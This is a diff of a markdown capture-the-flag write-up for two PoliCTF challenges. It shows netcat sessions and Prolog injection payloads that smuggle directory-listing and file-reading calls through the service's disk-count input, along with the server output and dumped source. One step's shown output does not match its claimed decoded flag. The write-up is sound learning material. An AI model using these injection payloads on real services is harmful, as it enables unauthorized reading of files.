@@ -23,6 +23,7 @@ So we start off with this:
 >**interview.polictf.it:80**
 
 Visit the address through your browser, and you'll receive a page that only displays the following text:
+
 ```
          ____                                     __                              __      
         /\  _`\                                  /\ \__                          /\ \__   
@@ -58,10 +59,13 @@ fish@sword:~$
 : command not found
 fish@sword:~$ 
 ```
+
 The browser's HTTP request being entered as commands is a fairly good indication that we need something more appropriate to access this system. [Netcat](https://en.wikipedia.org/wiki/Netcat) would handle connecting to port 80 nicely.
+
 ```
 nc interview.polictf.it 80
 ```
+
 Attempting any of the traditional bash commands will result in "command not found". 
 
 ```
@@ -69,6 +73,7 @@ fish@sword:~$ ls
  ls: command not found
 ```
 After a slew of failed commands, the solution was much more simple - typing in "help" was surprisingly helpful!
+
 ```
 fish@sword:~$ help
  A very hard interview: Codename Blow...Fish
@@ -87,16 +92,19 @@ ssh: A tiny ssh command
 date: A very useful and innovative feature
 ```
 The hacker command will literally print out "hacker" code to the screen [as if it was being typed by you](http://hackertyper.net/)! And the date command simply prints a date. Hint provides you with:
+
 ```
 useage:  ssh username@address
 address: a not so easily reachable IP address
 Very simple...isn't it?
 ```
 If you haven't picked it up already, this challenge is based around the interview scene in the movie [Swordfish](https://en.wikipedia.org/wiki/Swordfish_(film)) . I brought up a video of the [interview scene](https://www.youtube.com/watch?v=zfy5dFhw3ik) on YouTube and watched it. After alot of pausing and squinting, I realised that there is an IP address that looks fairly out of place, and I entered the typical username I would expect we were trying to access...
+
 ```
 fish@sword:~$ ssh admin@312.5.125.233
  flag{H4ll3_B3rry's_t0pl3ss_sc3n3_w4s_4ls0_n0t4bl3}
 ```
+
 And Success!
 ---
 
@@ -117,7 +125,9 @@ I really enjoyed this challenge as I learned alot from it. It was also the first
 Welcome to the Hanoi-as-a-Service cloud platform!
 How many disks does your tower have?
 ```
+
 Lets enter the number 3.
+
 ```
 3
 * Move top disk from a to b
@@ -128,18 +138,22 @@ Lets enter the number 3.
 * Move top disk from a to b
 * Move top disk from a to b
 ```
+
 This would be a nifty service if we were looking to play [Tower of Hanoi](https://en.wikipedia.org/wiki/Tower_of_Hanoi), however we want to see how we can attack this service to find the flag.
 
 Lets try some unexpected input, I entered the letter "w", which returned:
+
 ```
 ERROR: Prolog initialisation failed:
 ERROR: </2 Arithmetic: 'w/0' is not a function
 ```
+
 Interesting! [Prolog](https://en.wikipedia.org/wiki/Prolog) is a general purpose logic programming language, a quick google search reveals a [handy list of commands](http://www.swi-prolog.org/pldoc/man?section=builtin) to try. Some of the unsuccessful approaches I tried were:
 - Attempting to overflow the process by providing it with large input, however the code we dumped later showed that it had been coded to avoid processing input larger than 15 characters long.
 - Certain commands, such as 'shell()' were rejected with a one of three random messages, such as "Nope.", "What are you trying to do!?!" and "Sorry thats not implemented!".
 
 After some failed commands revealed the directory structure, this allowed me to focus my efforts on reaching the folders above, as it would likely be where the flag was hidden.
+
 ```
 root@kali:~# nc haas.polictf.it 80
 Welcome to the Hanoi-as-a-Service cloud platform!
@@ -161,6 +175,7 @@ Traceback (most recent call last):
 <type 'exceptions.OSError'>: [Errno 10] No child processes
 ```
 The 'working_directory' command seemed like the best command to try here...
+
 ```
 echo '2), working_directory(CWD, "/home/ctf/haas/"), ls %'|nc haas.polictf.it 80
 Welcome to the Hanoi-as-a-Service cloud platform!
@@ -171,6 +186,7 @@ How many disks does your tower have?
 haas			haas-proxy.py			jhknsjdfhef_flag_here
 ```
 This is fantastic - the flag is most likely sitting right there in that folder. After much reading and trial and error, the final command was crafted:
+
 ```
 echo '2), open("/home/ctf/haas/jhknsjdfhef_flag_here", read, Stream), read_line_to_codes(Stream,Codes), write(Codes) %'|nc haas.polictf.it 80
 Welcome to the Hanoi-as-a-Service cloud platform!
@@ -181,11 +197,15 @@ How many disks does your tower have?
 ERROR: Prolog initialisation failed:
 ERROR: open/3: source_sink '[47,104,111,109,101,47,99,116,102,47,104,97,97,115,47,106,104,107,110,115,106,100,114,104,101,102,95,102,108,97,103,95,104,101,114,101]' does not exist (No such file or directory)
 ```
+
 After converting the flag from decimal to ascii the flag was revealed!
+
 ```
 flag{Pr0gramm1ng_in_l0g1c_1s_c00l}
 ```
+
 For those who are interested, here is the code I was able to dump that was running "hanoi()".
+
 ```
 root@kali:~# echo '2), listing %'|nc haas.polictf.it 80
 Welcome to the Hanoi-as-a-Service cloud platform!
